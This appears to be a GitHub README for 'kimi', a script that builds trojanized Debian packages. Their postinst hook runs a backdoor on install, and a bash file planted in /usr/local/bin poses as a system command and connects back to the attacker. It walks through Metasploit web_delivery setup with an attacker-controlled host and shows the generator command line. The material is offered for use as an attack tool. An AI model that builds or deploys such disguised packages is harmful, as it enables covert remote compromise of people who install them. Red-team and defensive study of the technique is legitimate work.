# kimi - Malicious Debian Package generator
Script to generate malicious debian packages (debain trojans).

# About & Plus points & Usage & Tested On :::
    Kimi is name inspired from "Kimimaro" one of my favriote charater from anime called "Naruto".

    Kimi is a script which generates Malicious debian package for metasploit
    which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
    
    Backdoor gets executed just when victim tries to install deb package due to postinst file
    
    Bash file injects and also acts like some system command which when executed by victim 
    and attacker hits with session.
    
    Plus Points :
    -- Fully indiependent. Means user no need to install any debian package creator
    -- Can be integrated with any payload generator easily due to engagements of arguemt (lame :P i know) 
    
    Kimi basically depends upon web_delivery module and every thing is automated. 
    all the attacker needs is to do following settings :
    
    Setting up Web_Delivery in msf :
    
    msf > use exploit/multi/script/web_delivery
    msf exploit(web_delivery) > set srvhost 192.168.0.102
    srvhost => 192.168.0.102
    msf exploit(web_delivery) > set uripath /SecPatch
    uripath => /SecPatch
    msf exploit(web_delivery) > set Lhost 192.168.0.102
    Lhost => 192.168.0.102
    msf exploit(web_delivery) > show options
    msf exploit(web_delivery) > exploit
    
    Generating Malicious payload :
    
    dreamer@mindless ~/Desktop/projects/kimi $ sudo python kimi.py -n nano -l 127.0.0.1 -V 1.0 -a i386
    
    NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
    It can be used standalone also all user needs is to change uripath in msf variables
    -------------------------------------------------------------------------------------
    
    Tested on :
                Linux Mint 17.2 Cinnamon (Ubuntu 14.04) 
                ParrotOS (Debian Jessie)
                Kali Rolling 2.0
# Updates :::
    [Feb-22-2017]
    -- Added "postinst" file creation function to make embeded malicious file execution automated
    -- Added RC file generation function to fully automate with handler opening, means no need to 
        set handler manually
    -- Patched some common bugs [special thanks to r00t 3xp10it :)]
    
    [Oct-12-2017]
    -- Added command line argument(-a/--arch) to select architecture(i386/amd64)
    
# ScreenShots :::

![Main Banner](https://raw.githubusercontent.com/ChaitanyaHaritash/kimi/master/screenshots/kimi.PNG)
![Kimi In Action](https://raw.githubusercontent.com/ChaitanyaHaritash/kimi/master/screenshots/exploiting1.1.png)

# Misc :::
       Blog Post     : http://hackinguyz.blogspot.in/2017/03/kimi-malicious-debian-package-creator.html
       YouTube Video : https://youtu.be/Dsn6BRHy9_w  

# Shouts to :::
  Suspicious Shell Activity [Red Team]
# Doubts? Insults?
   Twitter : @bofheaded 
    | Wrote while listening jams of Vidya VOX ;) 
